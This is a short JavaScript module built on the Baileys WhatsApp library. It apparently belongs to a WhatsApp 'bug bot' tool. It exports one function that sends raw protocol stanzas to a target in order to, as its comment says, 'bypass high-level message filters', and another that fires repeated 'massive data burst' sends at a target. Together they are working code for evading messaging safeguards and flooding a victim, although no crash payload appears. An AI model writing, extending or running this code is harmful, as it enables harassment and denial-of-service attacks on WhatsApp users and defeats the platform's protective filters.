
const { encodeWAMessage, generateWAMessageFromContent } = require('@whiskeysockets/baileys');

/**
 * Sends a raw stanza node to bypass high-level message filters.
 * This mimics "Custom Baileys" behavior.
 */
async function sendRawBug(sock, target, messageContent) {
    try {
        const msg = await generateWAMessageFromContent(target, messageContent, {
            userJid: sock.user.id
        });

        // Encode the message to binary protobuf
        const messageBuffer = encodeWAMessage(msg.message);

        // Construct the raw XML-like stanza node
        const stanza = {
            tag: 'message',
            attrs: {
                to: target,
                type: 'text',
                id: msg.key.id
            },
            content: [
                {
                    tag: 'body',
                    attrs: {},
                    content: messageBuffer
                }
            ]
        };

        // Use the internal sendNode method to push the raw data
        await sock.sendNode(stanza);
        return true;
    } catch (error) {
        console.error("RawSender failed:", error.message);
        return false;
    }
}

/**
 * Sends a massive data burst using raw nodes.
 */
async function sendMassiveRawBurst(sock, target, node, count = 5) {
    for (let i = 0; i < count; i++) {
        try {
            await sock.sendNode(node);
        } catch (e) {
            console.log(`Burst ${i+1} failed`);
        }
    }
}

module.exports = { sendRawBug, sendMassiveRawBurst };
